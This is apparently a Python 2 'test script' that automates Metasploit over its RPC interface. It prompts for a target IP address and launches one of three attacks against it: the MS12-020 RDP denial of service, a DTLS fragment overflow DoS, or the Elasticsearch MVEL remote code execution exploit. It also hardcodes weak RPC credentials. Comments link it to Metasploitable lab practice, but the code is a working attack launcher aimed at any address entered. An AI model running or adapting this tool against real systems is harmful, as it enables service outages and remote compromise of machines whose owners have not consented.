#!/usr/bin/python2.7

"""
*
* Test Script 
* @author dlichtblau
* @collaboration w/ inijjer
*	
"""

import ipaddress
import sys
import time
import os
import subprocess
#import commands

try:
	import msfrpc
except ImportError: 
	os.system("clear")
	print("Installing msfrpc module...")
	os.system("git clone git://github.com/SpiderLabs/msfrpc.git msfrpc")
	os.system("cd msfrpc/python-msfrpc")
	os.system("python setup.py install")
	import msfrpc


#http://www.hackingarticles.in/perform-dos-attack-metasploitable-3/
#os.system("msfconsole load msgrpc Pass=abc123")

def start_msf():
	subprocess.call('gnome-terminal -x msfconsole -r /tmp/setup.rc', shell=True)
	#subprocess.call(['gnome-terminal', '-x', 'msfconsole -r /tmp/setup.rc'])
	
	os.system("clear")
	print("Starting Services")
	# Progress Bar
	toolbar_width = 40

	# setup toolbar
	sys.stdout.write("[%s]" % (" " * toolbar_width))
	sys.stdout.flush()
	sys.stdout.write("\b" * (toolbar_width+1)) # return to start of line, after '['
	
	for i in xrange(toolbar_width):
		time.sleep(0.2) 
		sys.stdout.write("-")
		sys.stdout.flush()
	
	sys.stdout.write("\n")

# Check if process has been started previously using subprocess (stackoverflow) # *
p = subprocess.Popen(["ps", "-aux"], stdout=subprocess.PIPE)					# *
out, err = p.communicate()														# *
if ('ruby /usr/bin/msfconsole -r /tmp/setup.rc' in str(out)):					# *
    print('msfconsole running...')
else:
	if os.path.exists('/tmp/setup.rc'):
		start_msf()
	else:
		setupRC = "db_connect msf:msf123@127.0.0.1/msf\nload msgrpc User=msf Pass='abc123'"
		with open('/tmp/setup.rc','w') as f:
			f.write(setupRC)
		start_msf()


try:
	client = msfrpc.Msfrpc({})
	client.login('msf','abc123')
except:
	print("ERROR: msfconsole not started...")
	print("")
	print("	 To start msfconsole manually: ")
	print("	 0. Open new terminal")
	print("	 1. msfconsole")
	print("	 2. load msgrpc Pass=abc123")
	exit()


os.system("clear")
## Main Functions
while True:
	attack_Dst = raw_input("Client Address: ")
	try:
		ipaddress.ip_address(bytearray(attack_Dst))
		break
	except ValueError:
		print("Invalid Address")



print("Select your attack")
print("1. DoS")
print("2. TLS DoS")
print("3. Exploit")

select = input("Selection: ")

def DoS():
    os.system("clear")
    ## Exploit found at: http://www.hackingarticles.in/perform-dos-attack-metasploitable-3/


    ## Example @ https://gist.github.com/carnal0wnage/5f5f64432738fc25c538
    res = client.call('console.create')
    console_id = res['id']
    print "res: %s" %res
    
    a = client.call('console.write', [console_id, "db_connect msf:abc123@127.0.0.1/msf\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "tester\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "set THREADS 10\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "use auxiliary/dos/windows/rdp/ms12_020_maxchannelids\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "set RHOST "+ str(attack_Dst) +"\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "set RPORT 3389\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "exploit\n"])
    time.sleep(5)

    while True:
        res = client.call('console.read',[console_id])
        if len(res['data']) > 1:
            print res['data'],

        if res['busy'] == True:
            time.sleep(1)
            continue

        break

    cleanup = client.call('console.destroy',[console_id])
    print "Cleanup result: %s" %cleanup['result']



# Possible DoS with tls and fragmentation 
def DoS2():
    os.system("clear")
    print("DoS2 Test...")


    res = client.call('console.create')
    console_id = res['id']
    print "res: %s" %res
    
    a = client.call('console.write', [console_id, "db_connect msf:abc123@127.0.0.1/msf\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "tester\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "set THREADS 10\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "use auxiliary/dos/ssl/dtls_fragment_overflow\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "set RHOST "+ str(attack_Dst) +"\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "run\n"])
    time.sleep(5)

    while True:
        res = client.call('console.read',[console_id])
        if len(res['data']) > 1:
            print res['data'],

        if res['busy'] == True:
            time.sleep(1)
            continue

        break

    cleanup = client.call('console.destroy',[console_id])
    print "Cleanup result: %s" %cleanup['result']



def Exploit():
    os.system("clear")
    print("Exploit Test...")


    res = client.call('console.create')
    console_id = res['id']
    print "res: %s" %res
    
    a = client.call('console.write', [console_id, "db_connect msf:abc123@127.0.0.1/msf\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "tester\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "set THREADS 10\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "use exploit/multi/elasticsearch/script_mvel_rce\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "set RHOST "+ str(attack_Dst) +"\n"])
    time.sleep(1)
    a = client.call('console.write', [console_id, "exploit\n"])
    time.sleep(5)

    while True:
        res = client.call('console.read',[console_id])
        if len(res['data']) > 1:
            print res['data'],

        if res['busy'] == True:
            time.sleep(1)
            continue

        break

    cleanup = client.call('console.destroy',[console_id])
    print "Cleanup result: %s" %cleanup['result']

#def one():
#    return "one"

tokenDict = {
	1:DoS,
	2:DoS2,
	3:Exploit
}


functionToCall = tokenDict[select]

functionToCall()
